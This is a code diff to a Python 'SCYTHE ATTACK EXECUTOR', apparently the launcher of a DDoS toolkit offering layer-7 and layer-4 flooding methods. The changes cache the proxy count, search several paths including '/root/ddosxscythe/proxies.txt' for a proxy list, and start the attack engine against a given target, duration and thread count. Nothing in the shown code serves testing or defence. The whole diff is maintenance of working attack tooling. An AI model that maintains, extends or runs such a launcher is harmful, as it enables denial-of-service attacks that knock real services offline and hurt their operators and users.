@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-SCYTHE ATTACK EXECUTOR v11.0 — 6 L7 + 4 L4 METHODS + CLOUDSCRAPER
+SCYTHE ATTACK EXECUTOR v11.1 — FIXED PROXY PATH + OPTIMIZED
 """
 import os
 import sys
@@ -247,6 +247,10 @@ class AttackExecutor:
         self._rps_regex = re.compile(r'RPS:\s*(\d+)', re.IGNORECASE)
         self._total_regex = re.compile(r'Total:\s*(\d+)', re.IGNORECASE)
         self._bytes_regex = re.compile(r'Bytes:\s*(\d+)', re.IGNORECASE)
+        # Cache proxy count
+        self._cached_proxy_count = 0
+        self._proxy_cache_time = 0
+        self._proxy_cache_ttl = 5  # seconds
 
     def start_proxy_refresh(self):
         if self.proxy_running:
@@ -266,12 +270,30 @@ class AttackExecutor:
         self.proxy_running = False
 
     def get_proxy_count(self):
+        """Get proxy count with caching to avoid frequent file reads"""
+        now = time.time()
+        if now - self._proxy_cache_time < self._proxy_cache_ttl:
+            return self._cached_proxy_count
+
         try:
-            if os.path.exists("proxies.txt"):
-                with open("proxies.txt", 'r') as f:
-                    return len([l for l in f if l.strip()])
+            script_dir = os.path.dirname(os.path.abspath(__file__))
+            possible_paths = [
+                "proxies.txt",
+                os.path.join(script_dir, "proxies.txt"),
+                os.path.join(os.path.dirname(script_dir), "proxies.txt"),
+                "/root/ddosxscythe/proxies.txt"
+            ]
+            for path in possible_paths:
+                if os.path.exists(path):
+                    with open(path, 'r') as f:
+                        count = len([l for l in f if l.strip()])
+                        self._cached_proxy_count = count
+                        self._proxy_cache_time = now
+                        return count
         except:
             pass
+        self._cached_proxy_count = 0
+        self._proxy_cache_time = now
         return 0
 
     def get_attack_info(self, method, target, port, duration, hold_time):
@@ -340,11 +362,22 @@ class AttackExecutor:
                     state.remove_attack(attack_id)
                     return False
 
-                # Proxy file path
-                proxy_file_path = os.path.join(script_dir, "proxies.txt")
-                if not os.path.exists(proxy_file_path):
-                    proxy_file_path = os.path.join(os.path.dirname(script_dir), "proxies.txt")
-                proxy_file_path = os.path.abspath(proxy_file_path)
+                # Proxy file path - cari di beberapa lokasi
+                proxy_file_path = None
+                possible_proxy_paths = [
+                    os.path.join(script_dir, "proxies.txt"),
+                    os.path.join(os.path.dirname(script_dir), "proxies.txt"),
+                    "proxies.txt",
+                    "/root/ddosxscythe/proxies.txt"
+                ]
+                for p in possible_proxy_paths:
+                    if os.path.exists(p):
+                        proxy_file_path = os.path.abspath(p)
+                        break
+
+                if not proxy_file_path:
+                    print(f"[WARN] proxies.txt not found. Using direct connection only.")
+                    proxy_file_path = ""
 
                 cmd = [sys.executable, engine_path, method, target, str(duration), str(threads), proxy_file_path]
                 env = os.environ.copy()
@@ -547,8 +580,10 @@ class AttackExecutor:
         state.stop_all()
 
 if __name__ == '__main__':
-    print("Scythe ATTACK EXECUTOR v11.0")
+    print("Scythe ATTACK EXECUTOR v11.1")
     print(f"Methods: {len(METHODS)} (6 L7 + 4 L4)")
     cpu, ram, disk = get_vps_specs()
     print(f"VPS: {cpu} cores | {round(ram,1)}GB RAM | {round(disk,1)}GB disk")
-    print(f"Proxy count: {AttackExecutor().get_proxy_count()}")
+    executor = AttackExecutor()
+    count = executor.get_proxy_count()
+    print(f"Proxy count: {count}")
